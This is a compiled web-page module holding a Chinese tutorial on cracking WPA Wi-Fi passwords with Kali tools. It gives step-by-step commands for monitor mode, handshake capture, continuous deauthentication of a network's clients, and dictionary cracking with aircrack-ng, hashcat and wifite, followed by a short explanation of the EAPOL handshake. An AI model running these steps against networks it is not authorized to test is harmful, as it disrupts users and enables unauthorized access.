import{_ as l,r as d,o as c,c as r,a as e,b as a,d as i,e as n}from"./app-4a23fbc3.js";const t={},o=n(`<h2 id="aircrack-ng" tabindex="-1"><a class="header-anchor" href="#aircrack-ng" aria-hidden="true">#</a> aircrack-ng</h2><p>使用 kali-linux 内置的 aircrack-ng 工具可进行 Wi-Fi 的抓包与分析。一般按照以下流程进行</p><ul><li><p>监听模式（monitor mode）: 监听数据包情况</p></li><li><p>抓取握手包（airodump-ng）: 采集 Wi-Fi 握手包，从而获取握手信息</p></li><li><p>主动攻击触发重连（deauth）: 主动使目标 Wi-Fi 的客户端重连，以采集握手包</p></li><li><p>跑密码本（aircrack-ng）: 通过握手包信息跑密码本</p></li></ul><p>其中，其他操作系统使用 aircrack 的 Monitor Mode，通常只是“半监听 / 扫描模式”，并不稳定。使用 kali-linux 环境更加合适</p><h2 id="流程" tabindex="-1"><a class="header-anchor" href="#流程" aria-hidden="true">#</a> 流程</h2><h3 id="查看网卡" tabindex="-1"><a class="header-anchor" href="#查看网卡" aria-hidden="true">#</a> 查看网卡</h3><p>先使用超级管理员用户 <code>sudo su</code> 或者直接使用 root terminal 查看无线网卡信息，可通过以下两种方式</p><ul><li>无线配置信息查看网卡<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>iwconfig
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li><li>通过 usb 信息查看网卡<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># ls 查看 usb 信息</span>
lsusb
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><h3 id="监听" tabindex="-1"><a class="header-anchor" href="#监听" aria-hidden="true">#</a> 监听</h3><ul><li>查询可监听的无线网卡的 Interface 信息<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>airmon-ng
<span class="token comment"># 输出可监听的信息</span>
<span class="token comment"># PHY   Interface  Driver Chipset</span>
<span class="token comment"># phy0  wlan0      驱动    芯片组</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li>开启监听<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 上一步获取的 Interface</span>
airmon-ng start wlan0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></li><li>查看是否监听成功<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">ifconfig</span>
<span class="token comment"># 此时列表内应该出现名称类似 wlanXmon 的内容</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></li><li>网络扫描<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 上一步获取的名称，此处以 wlan0mon 为例</span>
airodump-ng wlan0mon
<span class="token comment"># 输出扫描信息</span>
<span class="token comment"># BSSID           PWR       Beacons    #Data,    #/s         CH   MB    ENC          CIPHER   AUTH     ESSID</span>
<span class="token comment"># AP的MAC    信号强度    数据包交换情况    数据包数量  每秒数据包数  频道  速度  无线安全技术   加密方式  认证协议   无线名</span>
<span class="token comment"># ENC WPA2 指定的加密方式是 CCMP</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><h3 id="抓取握手包" tabindex="-1"><a class="header-anchor" href="#抓取握手包" aria-hidden="true">#</a> 抓取握手包</h3><h4 id="等待握手包出现" tabindex="-1"><a class="header-anchor" href="#等待握手包出现" aria-hidden="true">#</a> 等待握手包出现</h4><p>采集握手包的命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 扫描时获取的 频道             mac地址       握手包存储路径（文件夹或文件名）   无线网卡名称</span>
airodump-ng <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token parameter variable">--bssid</span> xx:xx:xx:xx:xx:xx    <span class="token parameter variable">-w</span> <span class="token builtin class-name">.</span>                      wlan0mon
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>输出内容示例如下</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 扫描信息 : 信道  持续时间    当前时间              是否采集到握手包（没采集到握手包时没有该项）
 CH xx ][ Elapsed: x min ][ 2026-01-01 12:00 ][ WPA handshake: xx:xx:xx:xx:xx:xx
# AP信息
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
xx:xx:xx:xx:xx:xx  -xx
# AP的客户端信息:    用户mac            信号   速率
BSSID              STATION            PWR   Rate    Lost    Frames  Nites  Probes
xx:xx:xx:xx:xx:xx  xx:xx:xx:xx:xx:xx  -xx    1e-xx      x        x
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>采集到握手包即可停止。会在文件夹内生成 cap 文件</p><h4 id="主动创造握手包" tabindex="-1"><a class="header-anchor" href="#主动创造握手包" aria-hidden="true">#</a> 主动创造握手包</h4><p>在新终端中使已连接 AP 的客户端断开</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 指定客户端断连</span>
<span class="token comment">#         发送断开请求   发送次数，0表示持续     ap 的 mac             客户端的 mac              无线网卡名称</span>
aireplay-ng       <span class="token parameter variable">-0</span>                  <span class="token number">0</span>   <span class="token parameter variable">-a</span>  xx:xx:xx:xx:xx:xx  <span class="token parameter variable">-c</span>  xx:xx:xx:xx:xx:xx    wlan0mon

<span class="token comment"># 全部客户端断连</span>
aireplay-ng <span class="token parameter variable">-0</span> <span class="token number">0</span> <span class="token parameter variable">-a</span> xx:xx:xx:xx:xx:xx wlan0mon <span class="token parameter variable">-D</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>同样等待采集终端出现 <code>[ WPA handshake: xx:xx:xx:xx:xx:xx</code> ，停止采集，会在文件夹内生成 cap 文件</p><h3 id="跑密码本" tabindex="-1"><a class="header-anchor" href="#跑密码本" aria-hidden="true">#</a> 跑密码本</h3><h4 id="aircrack" tabindex="-1"><a class="header-anchor" href="#aircrack" aria-hidden="true">#</a> aircrack</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#  握手包类型:a2指 WPA   ap mac                 密码本路径     上一步生成的cap文件</span>
aircrack-ng <span class="token parameter variable">-a2</span>      <span class="token parameter variable">-b</span> xx:xx:xx:xx:xx:xx   <span class="token parameter variable">-w</span> ./book.txt   ./xx.cap

<span class="token comment"># 简写</span>
aircrack-ng  <span class="token parameter variable">-w</span> ./book.txt   ./xx.cap
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="hashcat" tabindex="-1"><a class="header-anchor" href="#hashcat" aria-hidden="true">#</a> hashcat</h4>`,25),p={href:"https://hashcat.net/hashcat/",target:"_blank",rel:"noopener noreferrer"},m=n(`<ul><li>使用 hcxtools 工具，把 cap 转成 hashcat 格式<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">apt</span> update  <span class="token comment"># 更新索引</span>
<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> hcxtools  <span class="token comment"># 安装转换工具</span>
hcxpcapngtool handshake.cap <span class="token parameter variable">-o</span> wifi.hc22000  <span class="token comment"># 转换</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li>在显卡所在主系统内（避免虚拟机性能开销），运行<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>hashcat <span class="token parameter variable">-m</span> <span class="token number">22000</span> wifi.hc22000 wordlist.txt 
<span class="token comment"># 输入以下内容时，说明 Hashcat 为了兼容性（或者因为没加参数），使用了“纯净版”内核，没有使用针对 NVIDIA 架构深度优化的汇编指令。这会限制显卡的发挥。</span>
<span class="token comment"># ATTENTION! Pure (unoptimized) backend kernels selected.</span>
<span class="token comment"># 可添加 \`-O\` 参数优化内核，进行提速</span>
<span class="token comment"># 设置了工作负载（Workload Profile），也可提供显卡利用率，从而进行提速</span>
<span class="token comment">#  \`-w 3\` (High) 或 \`-w 4\` (Nightmare)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul>`,1),u=e("strong",null,"Tips",-1),h={href:"https://developer.nvidia.com/cuda-toolkit-archive",target:"_blank",rel:"noopener noreferrer"},v=n(`<h3 id="关闭监听状态" tabindex="-1"><a class="header-anchor" href="#关闭监听状态" aria-hidden="true">#</a> 关闭监听状态</h3><ul><li>关闭监听<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>airmon-ng stop wlan0mon
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li><li>检查是否关闭成功<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">ifconfig</span>
<span class="token comment"># 此时列表中的 wlanXmon 应该变回 wlanX</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><h2 id="wifite" tabindex="-1"><a class="header-anchor" href="#wifite" aria-hidden="true">#</a> Wifite</h2><p>基于 aircrack-ng 的使用流程步骤，wifite 对其进行了封装，使其更加易用。以下是 wifite 的使用流程</p><ul><li>进入扫描模式。此时会扫描出现的 Wi-Fi，并对其进行编号。按 ctrl + c 停止扫描，进入等待<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">su</span>
wifite
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></li><li>明确目标。在上一步中会等待输入编号，输入后会自动进行握手包采集、跑密码本等步骤</li></ul><h2 id="wi-fi-握手包" tabindex="-1"><a class="header-anchor" href="#wi-fi-握手包" aria-hidden="true">#</a> Wi-Fi 握手包</h2><p>Wi-Fi 握手包基于 eapol 协议(局域网扩展协议)，共进行 4 步</p><ul><li>AP 向外释放 ANonce 信号</li><li>STA（客户端）收到信号，生成 PTK。并回传随机数 SNonce 与 PTK 中的 MIC</li><li>AP 收到 SNonce 后，生成 PTK，将收到的 MIC 与生成的 PTK 中的 MIC 校验</li><li>校验成功，AP 使用 PTK 加密 GTK ，传给 STA（客户端）</li><li>STA（客户端）通过 PTK 解密 GTK，并验证加密使用的 MIC。验证成功后发送ACK</li></ul><p>可通过 Wireshark 打开 cap 文件，搜索 <code>eapol</code> 进行过滤</p><ul><li>指明加密方式 AES，WPA Key Nonce 64位 hash 值，Key IV 全0</li><li>新的 WPA Key Nonce 64位 hash 值，WPA Key MIC</li><li>WPA Key Nonce 64位 hash 值，新的 WPA Key MIC，WPA Key Data（密钥数据）</li><li>只包含新的 MIC 值</li></ul>`,10);function x(b,g){const s=d("ExternalLinkIcon");return c(),r("div",null,[o,e("p",null,[a("由于 aircrack-ng 是 CPU 取向工具，速度很慢。可使用 "),e("a",p,[a("hashcat"),i(s)]),a("，利用 GPU 进行计算，增加计算速度")]),m,e("p",null,[u,a(": hashcat 需要使用cuda，请 "),e("a",h,[a("下载"),i(s)]),a(" 合适版本的cuda进行安装。比如 9系显卡架构较旧，适合 10.2 版本的cuda。如果安装错误版本，可通过 geek 等软件进行卸载")]),v])}const f=l(t,[["render",x],["__file","024.html.vue"]]);export{f as default};
